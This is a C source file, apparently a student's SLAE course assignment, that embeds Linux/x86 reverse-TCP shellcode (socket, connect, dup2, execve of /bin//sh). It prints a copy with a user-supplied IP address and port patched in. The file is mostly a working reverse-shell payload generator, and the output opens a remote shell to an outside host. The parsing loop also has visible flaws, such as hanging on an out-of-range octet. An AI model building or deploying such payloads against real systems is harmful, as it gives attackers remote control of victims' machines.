
// SLAE - Assignment #1: Configurable port for Shell reverse TCP (Linux/x86) 
// Author:  Dipsy 
// Student ID: SLAE-1535

#include<stdio.h>
#include <stdlib.h>


unsigned char code[] = \
"\x29\xc0\xb0\x66\x29\xdb\xb3\x01\x29\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x29\xd2\x52\x68"
"\x99" //ip 
"\x66\x68"
"\x90" //port 
"\x66\x53\x89\xe1\x6a\x10\x51\x56\x43\x89\xe1\xcd\x80\x89\xf3\x29\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"; 



int main(int argc, char* argv[]){
    if (argc < 3)
        printf("Enter two arguments ip and port");
    else if (argc == 3) {
        int port = atoi(argv[2]); 

        if (port < 0 || port > 65535)
            printf("Port number should be between 0-65535");

        else {
            for (size_t i = 0; i < sizeof(code)-1; i++)
            {
                if (code[i] == 0x99) {

                    char* ptr = strtok(argv[1], "."); //cut the string using dot delimiter

                    int dots = 0;

                    while (ptr) {

                        int num = atoi(ptr); //convert string to number

                        if (num >= 0 && num <= 255) { //check if the number in the range 
                            printf("\\x%x", num);
                            ptr = strtok(NULL, "."); //cut the next part of the string
                            if (ptr != NULL)
                                dots++; //increase the dot count
                        }
                    }
                }

                else if (code[i] == 0x90) 
                    printf("\\x%x\\x%x", port >> 8, port & 0xff);
                
                else
                    printf("\\x%02hhx", code[i]);
            }

              
            }

               
        }

    }
